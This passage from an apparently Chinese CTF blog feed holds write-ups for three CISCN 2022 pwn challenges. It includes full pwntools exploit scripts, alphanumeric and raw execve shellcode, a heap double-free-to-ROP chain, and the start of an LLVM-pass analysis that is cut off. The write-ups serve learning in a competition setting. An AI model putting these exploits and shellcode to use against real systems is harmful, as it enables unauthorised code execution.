class="hljs-number">3</span>)<br><br>sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_competition：大哥别卷我</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022 ciscn 初赛</title>
    <link href="/2022/07/01/CTF_competition/2022ciscn/"/>
    <url>/2022/07/01/CTF_competition/2022ciscn/</url>
    
    <content type="html"><![CDATA[<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>主要是对程序逻辑的分析和可见字符的shellcode的编写，同时要注意shellcode的编写规则，这里是使用<code>rdx</code>进行触发。</p><blockquote><p> 参考文章：<a href="https://blog.csdn.net/SmalOSnail/article/details/105236336">(8条消息) 手把手教你写纯字符ascii shellcode——最通俗易懂的alphanumeric shellcode生成指南_TaQini852的博客-CSDN博客_ascii shellcode</a></p></blockquote><p>使用alpha3的基本步骤：</p><ol><li><p>python运行以下脚本生成shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shellcode_x64&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<span class="hljs-comment"># 注意打开的格式是wb</span><br>payload = asm(shellcraft.sh())<span class="hljs-comment"># 可以手写</span><br>f.write(payload)<br>f.close()<br></code></pre></td></tr></table></figure></li><li><p>使用命令生成可见字符的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python2 ./ALPHA3.py x64 ascii mixedcase rdx --input=&quot;shellcode_x64&quot;<br></code></pre></td></tr></table></figure></li></ol><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./login&#x27;</span>)<br><span class="hljs-comment"># sh = remote(&#x27;47.93.176.13&#x27;, 25792)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;&#x27;&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">TAYAXVI31VXPP[_Hc4:14:SX-&#125;/?w-x0An5C+&#123;(P^14:WX-@``?-@??_-|``aP_Hc4:14:SX-]oN&#125;-08/P5;W-vP^14:WX-@``?-@??_-|``aP_Hc4:14:SX-!/o&gt;-uTX 5Xtp(P^14:WX-@``?-@??_-|``aP_Hc4:14:SX-~~/?-?!0,5GZ#SP^14:WX-@``?-@??_-|``aP_Hc4:14:SX-^;?&#125;-w&quot; Z5#!f8P^14:WX-@``?-@??_-|``aP_Hc4:14:SX- ?^;-@@~@5%@VlP^14:WX-@``?-@??_-|``aP_SX- h#F- 9^@5X_~yP_Hc4:14:SX-W?/6-!@  5wb 9P^14:WX-@``?-@??_-|``aP_SX-.1o_-0wpx5&gt;V (P^SX-@~~7-Maaw5k  QP_AAAA|4oGf6^@nww`SjMMkct?=/w!&#123;~?&quot;uJ-&#x27;(R6sF`VUmo&#125;r__#33Vavp~0tS&lt;ZTC?Q-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-comment"># 使用ae64生成的shellcode</span><br><br>payload = <span class="hljs-string">&#x27;msg:ro0t\r\nopt:1\n\n&#x27;</span><br>sh.send(payload)<br>sh.recv()<br>payload = <span class="hljs-string">&#x27;msg:&#x27;</span> + shellcode + <span class="hljs-string">&#x27;\n&#x27;</span> + <span class="hljs-string">&#x27;opt:2\n\n&#x27;</span><br><span class="hljs-comment"># gdb.attach(sh)</span><br>sh.send(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h2><p>通过整型溢出使得分配的堆块大小大于<code>0x21000</code>，此堆块的指针就与libc存在固定的偏移，由此我们可以通过show这一个功能来泄露libc的地址，同时也可以通过内指针和environ来泄露栈地址，最后进行rop。</p><blockquote><p>比赛中没能想到这一点，属是有点弱鸡≧ ﹏ ≦</p></blockquote><p><code>malloc(8*0x20005000)</code>，将会得到一个位于.tls段上的指针：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/2gx <span class="hljs-variable">$rebase</span>(0x4190)</span><br>0x557505d22190: 0x00007fb40f836010      0x0000000020005000<br></code></pre></td></tr></table></figure><p>一个小tips：可以通过pwndbg中的search命令来寻找内指针：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">search</span><br>usage: search [-h] [-t &#123;byte,short,word,dword,qword,pointer,string,bytes&#125;] [-1] [-2] [-4] [-8] [-p] [-x] [-s] [-e]<br>              [-w] [--save] [--no-save] [-n]<br>              value [mapping_name]<br>search: error: the following arguments are required: value<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;environ</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = (&lt;data variable, no debug info&gt; *) 0x7fb40fa82ec0 &lt;environ&gt;</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">search -p 0x7fb40fa82ec0</span><br>libc.so.6       0x7fb40fa79fb8 0x7fb40fa82ec0<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/2gx 0x7fb40fa82ec0</span><br>0x7fb40fa82ec0 &lt;environ&gt;:       0x00007ffd346f8448      0x0000000000000000<br></code></pre></td></tr></table></figure><p>通过double_free修改main函数的返回地址，最后退出程序即可get_shell。需要注意进行fake_chunk分配的时候，目标地址的环境是否能满足分配条件。</p><p>WP如下：</p><blockquote><p>e4l4师傅的模板还是挺香的(●’◡’●)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./newest_note&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./newest_note&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./newest_note&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------#</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, data = <span class="hljs-string">&#x27;pursue&#x27;</span></span>):<br>    sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br>sla(<span class="hljs-string">&quot;How many pages your notebook will be? :&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x20005000</span>)) <span class="hljs-comment"># str()会将十六进制转化为十进制的字符串</span><br><br><span class="hljs-comment"># leak libc</span><br>show(<span class="hljs-number">0x4899a</span>)<br>libc_base = uu64() - <span class="hljs-number">0x218cc0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002e6c5</span><br>ret = libc_base + <span class="hljs-number">0x000000000002d9b9</span><br><br><span class="hljs-comment"># leak stack</span><br>show(<span class="hljs-number">0x487f5</span>)<br>stack_addr = uu64()<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i)  <span class="hljs-comment"># 0-9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(i)  <span class="hljs-comment"># 0-6</span><br><br><span class="hljs-comment"># leak heap</span><br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;key&#x27;</span>)<br>heap_base = key &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">7</span>)     <span class="hljs-comment"># double free</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i)<br><span class="hljs-comment"># dbg()</span><br>pld = p64((stack_addr - <span class="hljs-number">0x138</span>) ^ key)<br>add(<span class="hljs-number">0</span>, pld)<br>add(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>)<br>pld = p64(<span class="hljs-number">0</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br>add(<span class="hljs-number">3</span>, pld)     <span class="hljs-comment"># change main_ret_address</span><br><br>sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)     <span class="hljs-comment"># exit</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="satool-LLVM-Pwn"><a href="#satool-LLVM-Pwn" class="headerlink" title="satool(LLVM_Pwn)"></a>satool(LLVM_Pwn)</h2><p>LLVM_PASS的pwn题，做一下学习和总结：</p><blockquote><p>参考文章：</p><p><a href="https://zhuanlan.zhihu.com/p/122522485">LLVM Pass入门导引 - 知乎 (zhihu.com)</a></p><p>[<a href="https://bbs.pediy.com/thread-273119.htm">原创]LLVM PASS类pwn题入门-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p><a href="https://blog.csdn.net/qq_39948058/article/details/119938973">(11条消息) CTF$LLVM PWN学习_jsjsj11123的博客-CSDN博客</a></p><p><a href="https://lakwsh.net/?p=457">CISCN 2022 初赛 satool writeup – 数字的秘密基地 (lakwsh.net)</a></p></blockquote><p>在学习实例的过程中，注意LLVM的一些API的调用和理解(例如：<code>llvm::Value::getName</code>，详细了解我推荐看第二篇参考文章)，这将有助于我们进行代码审计，除此以外，我们主要逆向的是<code>runOnFunction</code>这个具有重写功能的函数。</p><p>下面是题目给的readme：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs te">## Introduction<br><br>A LLVM Pass that can optimize add/sub instructions.<br><br>## How to run<br><br>opt-12 -load ./mbaPass.so -mba &#123;*.bc/*.ll&#125; -S<br><br>## Example<br><br>### IR before optimization<br><br>```<br>define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;<br>  %2 = sub nsw i64 %0, 2<br>  %3 = add nsw i64 %2, 68<br>  %4 = add nsw i64 %0, 6<br>  %5 = add nsw i64 %4, -204<br>  %6 = add nsw i64 %5, %3<br>  ret i64 %6<br>&#125;<br>```<br><br>### IR after optimization<br><br>```<br>define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;<br>  %2 = mul i64 %0, 2<br>  %3 = add i64 %2, -132<br>  ret i64 %3<br>&#125;<br>```<br></code></pre></td></tr></table></figure><blockquote><p>第一次接触这种题目，详细总结一下。</p></blockquote><p>首先在IDA里面找到runOnFunction函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">.data.rel.ro:<span class="hljs-number">000000000001</span>CD30 D0 EE <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZN12_GLOBAL__N_17MBAPassD2Ev ; `anonymous namespace<span class="hljs-number">&#x27;</span>::MBAPass::~MBAPass()<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD38 F0 EE <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZN12_GLOBAL__N_17MBAPassD0Ev ; `anonymous namespace<span class="hljs-number">&#x27;</span>::MBAPass::~MBAPass()<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD40 <span class="hljs-number">80</span> DF <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(<span class="hljs-type">void</span>)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD48 D0 <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD50 F0 <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD58 D0 DE <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;,llvm::Module <span class="hljs-type">const</span>*)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD60 A0 DF <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;,<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-type">const</span>&amp;)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD68 <span class="hljs-number">90</span> DF <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;,llvm::PassManagerType)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD70 <span class="hljs-number">48</span> DF <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD78 <span class="hljs-number">30</span> DF <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(<span class="hljs-type">void</span>)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD80 <span class="hljs-number">70</span> DF <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD88 <span class="hljs-number">98</span> DF <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZN4llvm4Pass13releaseMemoryEv ; llvm::Pass::releaseMemory(<span class="hljs-type">void</span>)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD90 <span class="hljs-number">00</span> DF <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(<span class="hljs-type">void</span> <span class="hljs-type">const</span>*)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CD98 B8 DE <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(<span class="hljs-type">void</span>)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CDA0 <span class="hljs-number">50</span> DF <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(<span class="hljs-type">void</span>)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CDA8 <span class="hljs-number">58</span> DF <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(<span class="hljs-type">void</span>)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CDB0 F8 DE <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint)<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CDB8 <span class="hljs-number">20</span> EF <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       dq offset _ZN12_GLOBAL__N_17MBAPass13runOnFunctionERN4llvm8FunctionE ; `anonymous namespace<span class="hljs-number">&#x27;</span>::MBAPass::runOnFunction(llvm::Function &amp;)<span class="hljs-comment">// 我在这里🤭</span><br>.data.rel.ro:<span class="hljs-number">000000000001</span>CDB8                               _data_rel_ro ends<br>.data.rel.ro:<span class="hljs-number">000000000001</span>CDB8<br></code></pre></td></tr></table></figure><p>runOnFunction函数的主要漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 